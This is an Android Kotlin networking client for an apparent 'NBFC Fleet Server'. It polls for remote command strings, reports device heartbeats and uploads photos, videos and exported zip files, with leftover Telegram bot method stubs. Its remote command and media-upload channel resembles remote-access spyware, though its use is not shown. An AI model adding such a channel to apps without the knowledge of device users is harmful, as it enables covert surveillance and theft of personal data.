package com.example.data.api

import android.util.Log
import com.example.data.model.InlineKeyboardMarkup
import com.example.data.model.TelegramResponse
import com.example.data.model.TelegramUpdate
import com.example.data.model.TelegramUser
import com.example.data.model.LogType
import com.example.domain.log.LogRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class TelegramClient {

    companion object {
        private const val TAG = "FleetApiClient"
    }

    // Dedicated client for polling backend
    private val pollingHttpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    // Standard client for quick requests & media uploads
    private val standardHttpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private fun getCandidateUrls(baseServer: String): List<String> {
        val list = mutableListOf<String>()
        val clean = baseServer.trim().removeSuffix("/")
        if (clean.isNotBlank()) list.add(clean)
        val fallbackWifi = "http://192.168.1.6:5000"
        val fallbackLocal = "http://localhost:5000"
        val fallbackEmu = "http://10.0.2.2:5000"
        if (!list.contains(fallbackWifi)) list.add(fallbackWifi)
        if (!list.contains(fallbackLocal)) list.add(fallbackLocal)
        if (!list.contains(fallbackEmu)) list.add(fallbackEmu)
        return list
    }

    /**
     * Poll commands and report heartbeat to NBFC Fleet Server.
     * GET <serverUrl>/api/v1/devices/relay?action=poll&deviceId=xxx&battery=yy&model=zz
     */
    suspend fun pollBackendServer(
        serverUrl: String,
        deviceId: String,
        battery: Int,
        model: String
    ): Result<List<String>> = withContext(Dispatchers.IO) {
        val candidates = getCandidateUrls(serverUrl)
        var lastException: Exception? = null

        for (candidate in candidates) {
            try {
                val encodedDevice = java.net.URLEncoder.encode(deviceId, "UTF-8")
                val encodedModel = java.net.URLEncoder.encode(model, "UTF-8")
                val url = "$candidate/api/v1/devices/relay?action=poll&deviceId=$encodedDevice&battery=$battery&model=$encodedModel"

                val request = Request.Builder()
                    .url(url)
                    .get()
                    .build()

                val response = pollingHttpClient.newCall(request).execute()
                if (response.isSuccessful) {
                    val body = response.body?.string().orEmpty()
                    val json = org.json.JSONObject(body)
                    val commands = mutableListOf<String>()
                    if (json.has("commands")) {
                        val array = json.getJSONArray("commands")
                        for (i in 0 until array.length()) {
                            commands.add(array.getString(i))
                        }
                    }
                    return@withContext Result.success(commands)
                } else {
                    lastException = Exception("HTTP ${response.code}")
                }
            } catch (e: Exception) {
                lastException = e
            }
        }
        Log.e(TAG, "pollBackendServer error on all candidates: ${lastException?.message}")
        Result.failure(lastException ?: Exception("pollBackendServer failed"))
    }

    /**
     * Report command output, logs, or notifications directly to NBFC Fleet Server.
     * POST <serverUrl>/api/v1/devices/report
     */
    suspend fun reportToBackend(
        serverUrl: String,
        deviceId: String,
        type: String = "TEXT",
        text: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val candidates = getCandidateUrls(serverUrl)
        var lastException: Exception? = null

        for (candidate in candidates) {
            try {
                val jsonBody = org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("type", type)
                    put("text", text)
                }.toString()

                val body = jsonBody.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url("$candidate/api/v1/devices/report")
                    .post(body)
                    .build()

                val response = standardHttpClient.newCall(request).execute()
                if (response.isSuccessful) {
                    return@withContext Result.success(true)
                } else {
                    lastException = Exception("HTTP ${response.code}")
                }
            } catch (e: Exception) {
                lastException = e
            }
        }
        Log.e(TAG, "reportToBackend error on all candidates: ${lastException?.message}")
        Result.failure(lastException ?: Exception("reportToBackend failed"))
    }

    /**
     * Upload photo or video directly to NBFC Fleet Server.
     * POST <serverUrl>/api/v1/devices/upload-media
     */
    suspend fun uploadMediaToBackend(
        serverUrl: String,
        deviceId: String,
        fileBytes: ByteArray,
        fileName: String,
        mimeType: String = "image/jpeg",
        command: String = "/photo",
        caption: String = ""
    ): Result<String> = withContext(Dispatchers.IO) {
        val candidates = getCandidateUrls(serverUrl)
        var lastException: Exception? = null

        for (candidate in candidates) {
            try {
                val mediaType = mimeType.toMediaTypeOrNull()
                val filePart = fileBytes.toRequestBody(mediaType)

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("deviceId", deviceId)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("command", command)
                    .addFormDataPart("file", fileName, filePart)
                    .build()

                val request = Request.Builder()
                    .url("$candidate/api/v1/devices/upload-media")
                    .post(requestBody)
                    .build()

                val response = standardHttpClient.newCall(request).execute()
                val respString = response.body?.string().orEmpty()
                if (response.isSuccessful) {
                    return@withContext Result.success(respString)
                } else {
                    lastException = Exception("HTTP ${response.code}: $respString")
                }
            } catch (e: Exception) {
                lastException = e
            }
        }
        Log.e(TAG, "uploadMediaToBackend error on all candidates: ${lastException?.message}")
        Result.failure(lastException ?: Exception("uploadMediaToBackend failed"))
    }

    /**
     * Upload zip file or backup directly to NBFC Fleet Server.
     * POST <serverUrl>/api/v1/devices/upload-media
     */
    suspend fun uploadFileToBackend(
        serverUrl: String,
        deviceId: String,
        file: File,
        mimeType: String = "application/zip",
        command: String = "/export",
        caption: String = ""
    ): Result<String> = withContext(Dispatchers.IO) {
        val candidates = getCandidateUrls(serverUrl)
        var lastException: Exception? = null

        for (candidate in candidates) {
            try {
                val mediaType = mimeType.toMediaTypeOrNull()
                val filePart = file.asRequestBody(mediaType)

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("deviceId", deviceId)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("command", command)
                    .addFormDataPart("file", file.name, filePart)
                    .build()

                val request = Request.Builder()
                    .url("$candidate/api/v1/devices/upload-media")
                    .post(requestBody)
                    .build()

                val response = standardHttpClient.newCall(request).execute()
                val respString = response.body?.string().orEmpty()
                if (response.isSuccessful) {
                    return@withContext Result.success(respString)
                } else {
                    lastException = Exception("HTTP ${response.code}: $respString")
                }
            } catch (e: Exception) {
                lastException = e
            }
        }
        Log.e(TAG, "uploadFileToBackend error on all candidates: ${lastException?.message}")
        Result.failure(lastException ?: Exception("uploadFileToBackend failed"))
    }

    // Legacy signatures kept as aliases/stubs so nothing throws NoSuchMethodError
    suspend fun sendMessage(
        token: String = "",
        chatId: Long = 0L,
        text: String,
        replyMarkup: InlineKeyboardMarkup? = null
    ): Result<Boolean> = Result.success(true)

    suspend fun sendPhoto(
        token: String = "",
        chatId: Long = 0L,
        imageBytes: ByteArray,
        filename: String,
        caption: String? = null
    ): Result<Boolean> = Result.success(true)

    suspend fun sendVideo(
        token: String = "",
        chatId: Long = 0L,
        videoBytes: ByteArray,
        filename: String,
        caption: String? = null
    ): Result<Boolean> = Result.success(true)

    suspend fun sendDocumentFile(
        token: String = "",
        chatId: Long = 0L,
        file: File,
        caption: String? = null
    ): Result<Boolean> = Result.success(true)

    suspend fun getMe(token: String): Result<TelegramUser> =
        Result.success(TelegramUser(id = 1L, firstName = "FleetServer", username = "nbfc_fleet"))

    suspend fun getUpdates(
        token: String,
        offset: Long?,
        timeoutSeconds: Int = 25
    ): Result<List<TelegramUpdate>> = Result.success(emptyList())

    suspend fun pollRelay(
        relayUrl: String,
        deviceId: String,
        battery: Int,
        model: String
    ): Result<List<String>> = Result.success(emptyList())

    suspend fun forwardRelayCommand(
        relayUrl: String,
        targetDeviceId: String,
        command: String
    ): Result<Boolean> = Result.success(true)
}
